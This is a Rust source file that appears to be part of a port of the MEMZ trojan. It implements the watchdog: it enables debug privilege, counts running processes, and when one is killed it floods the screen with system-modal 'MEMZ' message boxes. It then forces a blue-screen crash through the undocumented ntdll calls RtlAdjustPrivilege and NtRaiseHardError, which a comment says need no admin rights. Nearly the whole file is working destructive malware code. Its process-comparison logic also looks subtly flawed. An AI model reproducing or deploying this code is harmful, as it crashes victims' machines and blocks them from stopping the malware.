#![allow(unused_imports)]
#![allow(dead_code)]
use memz_rs::{
    convert_str::ToPCSTRWrapper,
    data::data::MSGS,
    ntdll::{
        library::Library,
        ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
    },
    payloads::payloads::msg_box_hook,
    wrap_windows_api::{
        wrap_close_handle, wrap_create_toolhelp32_snapshot, wrap_get_current_thread_id,
        wrap_get_process_image_filename_a, wrap_messagebox_a, wrap_process32_next,
        wrap_set_privilege, wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, Resolution,
    },
    LMEM_ZEROINIT,
};
use rand::Rng;
use std::{
    mem::size_of,
    thread::{self, sleep},
    time::Duration,
};
use windows::Win32::{
    Foundation::{BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE, NTSTATUS},
    Graphics::Gdi::HFONT,
    System::{
        Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
        Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_QUERY_LIMITED_INFORMATION},
    },
    UI::WindowsAndMessaging::{MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
};

struct Clean {
    main_window: HWND,
    font: HFONT,
    dialog: HWND,
}

fn kill_windows() -> Result<(), ()> {
    for _ in 0..20 {
        let rip_message_thread = thread::spawn(move || -> Result<(), ()> {
            let hook = wrap_set_windows_hook_ex_a(
                WH_CBT,
                Some(msg_box_hook),
                HMODULE(0_isize),
                wrap_get_current_thread_id(),
            )?;
            let mut rng = rand::thread_rng();
            let random = rng.gen_range(0..=25);
            wrap_messagebox_a(
                HWND(Default::default()),
                *MSGS[random as usize].to_pcstr(),
                "MEMZ",
                MB_OK | MB_SYSTEMMODAL | MB_ICONHAND,
            )?;
            wrap_unhook_windows_hook_ex(hook)?;
            Ok(())
        });
        rip_message_thread.join().unwrap().unwrap();
        sleep(Duration::from_millis(100));
    }

    kill_windows_instant()?;
    Ok(())
}

fn kill_windows_instant() -> Result<(), ()> {
    // Try to force BSOD first
    // I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
    // This isn't even an exploit, it's just an undocumented feature.
    let mut tmp1 = 0;
    let mut tmp2 = 0;
    let lib = Library::new("ntdll.dll");
    let rtl_adjust_privilege_proc: Option<RtlAdjustPrivilegeFn> =
        lib.get_proc("RtlAdjustPrivilege");

    match rtl_adjust_privilege_proc {
        Some(rtl_adjust_privilege) => rtl_adjust_privilege(19, 1, 0, &mut tmp1),
        None => panic!("Failed GetProc RtlAdjustPrivilege"),
    };

    let nt_raise_hard_error_proc: Option<NtRaiseHardErrorFn> = lib.get_proc("NtRaiseHardError");

    match nt_raise_hard_error_proc {
        Some(nt_raise_hard_error) => {
            nt_raise_hard_error(NTSTATUS(0xc0000022 as u32 as i32), 0, 0, 0, 6, &mut tmp2)
        }
        None => panic!("Failed GetProc NtRaiseHardError"),
    };

    Ok(())
}

fn main() {
    let res = Resolution::new();
    let watchdog_thread = thread::spawn(watchdog_thread);
    watchdog_thread.join().unwrap().unwrap();
}

fn watchdog_thread() -> Result<(), ()> {
    let mut oproc = 0;
    let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
    wrap_get_process_image_filename_a(&mut f_buf1)?;
    #[cfg(feature = "DEBUG")]
    {
        println!("f_buf1: {}", String::from_utf8_lossy(&f_buf1.as_slice()));
        sleep(Duration::from_millis(1000));
    }
    sleep(Duration::from_millis(1000));
    
    dbg!(wrap_set_privilege("SeDebugPrivilege", true)?);

    loop {
        let snapshot = wrap_create_toolhelp32_snapshot()?;
        #[cfg(feature = "DEBUG")]
        {
            dbg!(&snapshot);
            sleep(Duration::from_millis(1000));
        }
        let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
            dwSize: size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };
        #[cfg(feature = "DEBUG")]
        {
            // dbg!(&proc);
            sleep(Duration::from_millis(1000));
        }
        unsafe {
            Process32First(snapshot, &mut proc);
            #[cfg(feature = "DEBUG")]
            {
                println!(
                    "Process32First() proc.th32ProcessID: {}",
                    proc.th32ProcessID
                );
                println!(
                    "Process32First() proc.szExeFile: {}",
                    String::from_utf8_lossy(&proc.szExeFile)
                );
                sleep(Duration::from_millis(1000));
            }
        }

        let mut nproc = 0;
        loop {
            let mut h_proc: Option<HANDLE> = None;
            if proc.th32ProcessID != 0 {
                unsafe {
                    h_proc = match OpenProcess(
                        PROCESS_QUERY_INFORMATION, // Permission Denined: PROCESS_QUERY_INFORMATION
                        BOOL(0),
                        proc.th32ProcessID,
                    ) {
                        Ok(handle) => Some(handle),
                        Err(e) => {
                            dbg!(&e);
                            None
                        }
                    };
                }
            }
            #[cfg(feature = "DEBUG")]
            {
                dbg!(&h_proc);
                sleep(Duration::from_millis(1000));
            }
            let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
            wrap_get_process_image_filename_a(&mut f_buf2)?;
            #[cfg(feature = "DEBUG")]
            {
                println!("f_buf2: {}", String::from_utf8_lossy(&f_buf2.as_slice()));
                sleep(Duration::from_millis(1000));
            }
            if f_buf1 != f_buf2 {
                nproc += 1;
                #[cfg(feature = "DEBUG")]
                {
                    dbg!(&nproc);
                    sleep(Duration::from_millis(1000));
                }
            }

            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
            drop(f_buf2);

            #[cfg(not(feature = "DEBUG"))]
            if !wrap_process32_next(snapshot, &mut proc) {
                break;
            }
            #[cfg(feature = "DEBUG")]
            if dbg!(!wrap_process32_next(snapshot, &mut proc)) {
                break;
            }

            if proc.th32ProcessID == 0 {
                panic!("Unable to open system process");
            }

            #[cfg(feature = "DEBUG")]
            {
                println!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
                println!(
                    "Process32Next() proc.szExeFile: {}",
                    String::from_utf8_lossy(&proc.szExeFile)
                );
                sleep(Duration::from_millis(1000));
            }
        }
        wrap_close_handle(snapshot)?;

        if nproc < oproc {
            kill_windows()?;
        }
        oproc = nproc;

        sleep(Duration::from_millis(10));
    }
}
